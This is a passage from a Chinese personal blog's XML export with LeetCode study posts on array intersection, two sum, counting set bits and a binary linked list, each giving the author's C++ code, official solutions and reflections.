<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解也是用的计数法，还改了个名字叫桶计数🤣，嗯，简单题不难，只要努力去做都会做出来的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>两个数的交集</title>
    <url>/2020/11/02/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%9A%84%E4%BA%A4%E9%9B%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>两个数的交集</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h6><p>给定两个数组，编写一个函数来计算它们的交集。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>], nums2 = [<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">输出：[<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [<span class="number">4</span>,<span class="number">9</span>,<span class="number">5</span>], nums2 = [<span class="number">9</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">4</span>]</span><br><span class="line">输出：[<span class="number">9</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ul>
<li>输出结果中的每个元素一定是唯一的。</li>
<li>我们可以不考虑输出结果的顺序。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>这道题思路还比较好像，比较明确但是可能不是很简便的方法，使用多重for循环，先遍历nums1中每一个元素在nums2中查找是否存在，若存在再判断是否已经保存在输出结果中了这样可以保证输出结果每个元素的唯一性。</p>
<p><strong>c++代码：</strong>(执行用时56ms，击败5.86%，内存消耗10.2M，击败78.25%)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="comment">//遍历第一个数组中的元素，查找第二个数组中是否存在相同的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums2.size(); ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[i] == nums2[j]) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(result.size() == <span class="number">0</span>) &#123;</span><br><span class="line">                        result.push_back(nums1[i]);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//判断result中是否已经存在</span></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; result.size(); k++) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(nums1[i] == result[k]) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(k == result.size() - <span class="number">1</span>) &#123;</span><br><span class="line">                                result.push_back(nums1[i]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays/solution/liang-ge-shu-zu-de-jiao-ji-by-leetcode-solution/">官方题解：</a></h6><p><strong>方法一：两个集合</strong></p>
<p>计算两个数组的交集，直观的方法是遍历数组 <code>nums1</code>，对于其中的每个元素，遍历数组 <code>nums2</code> 判断该元素是否在数组 <code>nums2</code> 中，如果存在，则将该元素添加到返回值。假设数组 <code>nums1</code> 和 <code>nums2</code> 的长度分别是 $m$ 和 $n$，则遍历数组 <code>nums1</code> 需要 $O(m)$ 的时间，判断 <code>nums1</code> 中的每个元素是否在数组 <code>nums2</code> 中需要 $O(n)$ 的时间，因此总时间复杂度是 $O(mn)$。</p>
<p>如果使用哈希集合存储元素，则可以在 $O(1)$ 的时间内判断一个元素是否在集合中，从而降低时间复杂度。</p>
<p>首先使用两个集合分别存储两个数组中的元素，然后遍历较小的集合，判断其中的每个元素是否在另一个集合中，如果元素也在另一个集合中，则将该元素添加到返回值。该方法的时间复杂度可以降低到 $O(m+n)$。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt; set1, set2;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; num : nums1) &#123;</span><br><span class="line">            set1.insert(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; num : nums2) &#123;</span><br><span class="line">            set2.insert(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getIntersection(set1, set2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">getIntersection</span><span class="params">(<span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt;&amp; set1, <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt;&amp; set2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (set1.size() &gt; set2.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> getIntersection(set2, set1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; num : set1) &#123;</span><br><span class="line">            <span class="keyword">if</span> (set2.count(num)) &#123;</span><br><span class="line">                intersection.push_back(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(m+n)$，其中 $m$ 和 $n$ 分别是两个数组的长度。使用两个集合分别存储两个数组中的元素需要 $O(m+n)$ 的时间，遍历较小的集合并判断元素是否在另一个集合中需要 $O(min(m,n))$ 的时间，因此总时间复杂度是 $O(m+n)$。</li>
<li><strong>空间复杂度：</strong>$O(m+n)$，其中 $m$ 和 $n$ 分别是两个数组的长度。空间复杂度主要取决于两个集合。</li>
</ul>
<p><strong>方法二：排序+双指针</strong></p>
<p>如果两个数组是有序的，则可以使用双指针的方法得到两个数组的交集。</p>
<p>首先对两个数组进行排序，然后使用两个指针遍历两个数组。可以预见的是加入答案的数组的元素一定是递增的，为了保证加入元素的唯一性，我们需要额外记录变量 $pre$ 表示上一次加入答案数组的元素。</p>
<p>初始时，两个指针分别指向两个数组的头部。每次比较两个指针指向的两个数组中的数字，如果两个数字不相等，则将指向较小数字的指针右移一位，如果两个数字相等，且该数字不等于 $pre$ ，将该数字添加到答案并更新 $pre$ 变量，同时将两个指针都右移一位。当至少有一个指针超出数组范围时，遍历结束。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        sort(nums1.begin(), nums1.end());</span><br><span class="line">        sort(nums2.begin(), nums2.end());</span><br><span class="line">        <span class="keyword">int</span> length1 = nums1.size(), length2 = nums2.size();</span><br><span class="line">        <span class="keyword">int</span> index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1 &amp;&amp; index2 &lt; length2) &#123;</span><br><span class="line">            <span class="keyword">int</span> num1 = nums1[index1], num2 = nums2[index2];</span><br><span class="line">            <span class="keyword">if</span> (num1 == num2) &#123;</span><br><span class="line">                <span class="comment">// 保证加入元素的唯一性</span></span><br><span class="line">                <span class="keyword">if</span> (!intersection.size() || num1 != intersection.back()) &#123;</span><br><span class="line">                    intersection.push_back(num1);</span><br><span class="line">                &#125;</span><br><span class="line">                index1++;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num1 &lt; num2) &#123;</span><br><span class="line">                index1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p><strong>时间复杂度：</strong>$O(mlogm+nlogn)$，其中 $m$ 和 $n$ 分别是两个数组的长度。对两个数组排序的时间复杂度分别是$O(mlogm)$ 和 $O(nlogn)$，双指针寻找交集元素的时间复杂度是 $O(m+n)$，因此总时间复杂度是 $O(mlogm+nlogn)$。</p>
</li>
<li><p><strong>空间复杂度：</strong>$O(logm+logn)$，其中 $m$ 和 $n$ 分别是两个数组的长度。空间复杂度主要取决于排序使用的额外空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>看到这道题目，我首先想到的就是那种直观的解法，看完官方题解后发现还是STL模板库没有学好，unordered_set这个容器根本都没见过🤣，本来下午刚看完基础的STL模板库，以为够用了看来还是得学啊，另外对这些容器的底层实现不是很了解还有复杂度分析了解甚少不太会计算复杂度，基本分不清哪些容器的效率差异，或者说自己对这方面还不敏感觉得好像都差不多没那么重要😥，接下来抽时间好好看看STL标准库和STL源码剖析吧，🤯</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>两数之和</title>
    <url>/2020/10/20/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/two-sum/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>两数之和</p>
<p><strong>难度：</strong>⭐</p>
<p><strong>题目描述：</strong></p>
<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 nums &#x3D; [2, 7, 11, 15], target &#x3D; 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>



<p>下面是自己提交通过的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建vector容器，有2个元素，初始值默认为0</span></span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">arr</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">        <span class="comment">//获取容器元素个数</span></span><br><span class="line">        <span class="keyword">int</span> len=nums.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)&#123;</span><br><span class="line">                    arr[<span class="number">0</span>]=i;</span><br><span class="line">                    arr[<span class="number">1</span>]=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义s，类型为Solution</span></span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="comment">//初始化vector容器nums</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums&#123;<span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> target=<span class="number">9</span>;</span><br><span class="line">    <span class="comment">//调用对象s的twoSum函数，返回值是vector容器类型</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result=s.twoSum(nums,target);</span><br><span class="line">    <span class="comment">//遍历vector容器</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;[&quot;</span>&lt;&lt;result[<span class="number">0</span>]&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;result[<span class="number">1</span>]&lt;&lt;<span class="string">&quot;]&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>代码是在codeblocks上编写的完整版，提交答案的时候只需要提交Solution类的代码就可以。</p>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>



<p><strong>方法一：暴力枚举</strong><br><strong>思路及算法</strong></p>
<p>最容易想到的方法是枚举数组中的每一个数 <code>x</code>，寻找数组中是否存在 <code>target - x</code>。</p>
<p>当我们使用遍历整个数组的方式寻找 <code>target - x</code> 时，需要注意到每一个位于 <code>x</code> 之前的元素都已经和 <code>x</code> 匹配过，因此不需要再进行匹配。而每一个元素不能被使用两次，所以我们只需要在 <code>x</code> 后面的元素中寻找 <code>target - x</code>。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] + nums[j] == target) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;i, j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：<em>O(N<sup>2</sup>)</em>，其中<em>N</em>是数组中的元素数量。最坏情况下数组中任意两个数都要被匹配一次。</li>
<li>空间复杂度：<em>O(1)</em>。</li>
</ul>
<p><strong>方法二：哈希表</strong><br><strong>思路及算法</strong></p>
<p>注意到方法一的时间复杂度较高的原因是寻找 <code>target - x</code> 的时间复杂度过高。因此，我们需要一种更优秀的方法，能够快速寻找数组中是否存在目标元素。如果存在，我们需要找出它的索引。</p>
<p>使用哈希表，可以将寻找 <code>target - x</code> 的时间复杂度降低到从 <em>O(N)</em> 降低到 <em>O(1)</em>。</p>
<p>这样我们创建一个哈希表，对于每一个 <code>x</code>，我们首先查询哈希表中是否存在 <code>target - x</code>，然后将 <code>x</code> 插入到哈希表中，即可保证不会让 <code>x</code> 和自己匹配。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; hashtable = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashtable.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;hashtable.get(target - nums[i]), i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：<em>O(N)</em>，其中N是数组中的元素数量。对于每一个元素<code>x</code>，我们可以<em>O(1)</em>地寻找<code>target-x</code>。</li>
<li>空间复杂度：<em>O(N)</em>，其中<em>N</em>是数组中的元素数量。主要为哈希表的开销。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>



<p>这好像是我在LeetCode平台上面做的第一道题，好久没用C++了，知识点都忘了，最近python写多了编程序时有几个error就是按python语法写的🤣。上周就看这道题了，看到题目已经给出的部分代码，vector容器我没咋用过啊，当时就乱写最后不是这个测试用例不通过就是那个出错，所以我就用了一周多的时间把菜鸟教程上c&amp;c++又学习了一遍，STL标准模板库没来得及看完，就把这道题需要的vector容器看了。提交完答案看官方题解分析，自己用的是第一种方法暴力枚举，效率确实不是很高啊😅；第二种方法是使用了哈希表，确实是一种更优秀的方法，也是属于STL的范畴，看来我还得抽时间赶紧把C++的STL标准模板库给学了。c&amp;c++基础已经复习完了，题目也可以开始刷起来了，希望以后持续的做LeetCode题，将来的你一定会感谢现在拼命的自己，加油🎈</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制中1的个数</title>
    <url>/2020/11/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>请实现一个函数，输入一个整数（以二进制串形式），输出该数二进制表示中 1 的个数。例如，把 9 表示成二进制是 1001，有 2 位是 1。因此，如果输入 9，则该函数输出 2。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：00000000000000000000000000001011</span><br><span class="line">输出：3</span><br><span class="line">解释：输入的二进制串 00000000000000000000000000001011 中，共有三位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：00000000000000000000000010000000</span><br><span class="line">输出：1</span><br><span class="line">解释：输入的二进制串 00000000000000000000000010000000 中，共有一位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：11111111111111111111111111111101</span><br><span class="line">输出：31</span><br><span class="line">解释：输入的二进制串 11111111111111111111111111111101 中，共有 31 位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>输入必须是长度为 <code>32</code> 的 <strong>二进制串</strong> 。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>把整数转成二进制，统计各位相加的和，就是</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败8.79%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//整数转成二进制，统计值为1的位数</span></span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            result+=n%<span class="number">2</span>;</span><br><span class="line">            n=n/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，不过题解里有一些好的思想，从位运算进行求解。</p>
<p><strong>与运算逐位判断：</strong></p>
<ul>
<li>判断 n 最右一位是否为 1 ，根据结果计数。</li>
<li>将 n 右移一位，循环。 </li>
</ul>
<p><strong>巧用n&amp;(n-1)：</strong></p>
<ul>
<li>(n - 1) 解析： 二进制数字 n 最右边的 1 变成 0 ，此 1 右边的 0 都变成 1 。</li>
<li>n \&amp; (n - 1)解析： 二进制数字 n 最右边的 1 变成 0 ，其余不变。</li>
</ul>
<p>多种解法解题效率差不多。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制链表转整数</title>
    <url>/2020/11/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%93%BE%E8%A1%A8%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个单链表的引用结点 <code>head</code>。链表中每个结点的值不是 0 就是 1。已知此链表是一个整数数字的二进制表示形式。</p>
<p>请你返回该链表所表示数字的 <strong>十进制值</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%93%BE%E8%A1%A8%E8%BD%AC%E6%95%B4%E6%95%B0/graph-1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [1,0,1]</span><br><span class="line">输出：5</span><br><span class="line">解释：二进制数 (101) 转化为十进制数 (5)</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [0]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [1]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
